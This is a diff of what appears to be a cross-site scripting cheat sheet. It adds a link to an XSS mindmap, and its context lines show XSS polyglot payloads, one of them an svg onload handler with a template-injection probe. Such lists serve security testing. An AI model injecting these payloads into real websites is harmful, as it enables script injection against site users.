@@ -4,6 +4,8 @@ JavaScript://%250A/*?'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Scri
 ```
 ### XSS payloads
 `https://github.com/foospidy/payloads/tree/master/other/xss`
+### XSS mindmap
+`https://raw.githubusercontent.com/cyberspacekittens/XSS/master/XSS2.png`
 ### XSS ployglot
 ```
 \u0022\u003c%26quot;%26gt;%26lt;"';}};"></ScRipt><svg/oNLoad=confirm(69)>${{7*7}}
